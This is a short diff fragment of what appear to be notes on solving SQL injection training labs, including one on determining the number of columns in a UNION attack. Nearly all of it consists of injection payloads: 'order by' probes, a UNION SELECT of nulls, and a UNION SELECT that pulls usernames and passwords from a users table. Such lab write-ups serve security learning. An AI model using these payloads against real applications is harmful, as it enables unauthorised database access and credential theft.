@@ -70,12 +70,12 @@ order by 2--
 ```sh
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
 ```
-### 
+### Lab: SQL injection UNION attack, determining the number of columns returned by the query
 ```sh
-
+order by 3--
 ```
 ```sh
-
+'union select null,null,null--
 ```
 ###
 ```sh
